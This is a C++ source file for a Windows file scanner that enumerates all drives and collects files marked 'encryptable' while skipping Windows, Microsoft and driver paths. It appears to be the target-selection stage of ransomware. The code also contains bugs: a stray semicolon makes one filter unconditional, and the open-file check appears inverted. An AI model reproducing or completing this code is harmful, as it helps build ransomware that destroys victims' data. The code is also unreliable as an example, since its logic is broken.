#include "filescan.h"

#include "logger.h"

#include <filesystem>
#include <iostream>
#include <string>
#include <Windows.h>
#include <tchar.h>
#include <fstream>

std::vector<std::string> c_filescan::drives;
std::vector<fs::v1::path> c_filescan::files;

int c_filescan::file_amount = 0;

void c_filescan::init_drives()
{
	DWORD logical_drives = GetLogicalDrives();

	for (int i = 0; i < 26; i++)
	{
		if (logical_drives & (1 << i))
		{
			TCHAR drive_name[] = { 'A' + i, ':', '\\', '\0' };
			c_filescan::drives.push_back(std::string(drive_name));
		}
	}
}

bool c_filescan::is_encryptable(std::string file)
{
	if (file.find("Windows") == std::string::npos && file.find("Microsoft") == std::string::npos &&
		file.find("Drivers") == std::string::npos)
		return true;

	return false;
}

void c_filescan::scan()
{
	c_filescan::init_drives();

	for (int i = 0; i < c_filescan::drives.size(); i++) 
	{
		std::string drive = c_filescan::drives[i];

		if (drive.find("C") != std::string::npos)
		{
			for (fs::recursive_directory_iterator i(drive), end; i != end; ++i)
			{
				if (!fs::is_directory(i->path()))
				{
					std::ifstream ifstream(i->path());

					if (!ifstream.is_open() && c_filescan::is_encryptable(i->path().u8string()));
					{
						c_filescan::files.push_back(i->path());
						c_filescan::file_amount++;
					}
				}
			}
		}
		else
		{
			for (fs::recursive_directory_iterator i(drive), end; i != end; ++i)
			{
				if (!fs::is_directory(i->path()))
				{
					std::ifstream ifstream(i->path());

					if (!ifstream.is_open())
					{
						c_filescan::files.push_back(i->path().u8string());
						c_filescan::file_amount++;
					}
				}
			}			
		}
		
	}
}
